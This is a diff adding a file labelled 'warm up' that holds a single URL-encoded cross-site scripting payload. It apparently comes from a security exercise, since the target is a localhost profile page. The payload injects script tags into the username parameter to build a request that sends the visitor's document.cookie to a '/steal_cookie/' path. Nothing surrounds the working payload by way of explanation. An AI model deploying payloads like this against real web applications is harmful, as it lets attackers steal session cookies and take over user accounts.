@@ -1,0 +1,3 @@
+warm up:
+
+http://localhost:3000/profile?username=test%3Cscript%20type=%27text/javascript%27%3E%20var%20xhr%20=%20new%20XMLHttpRequest()%20%3C/script%3E%20%3Cscript%20type=%27text/javascript%27%3E%20xhr.open(%27GET%27,%20%27/steal_cookie/?cookie=%27%2Bdocument.cookie,%20true)%20%3C/script%3E%20%3Cscript%20type=%27text/javascript%27%3Exhr.send()%20%3C/script%3E
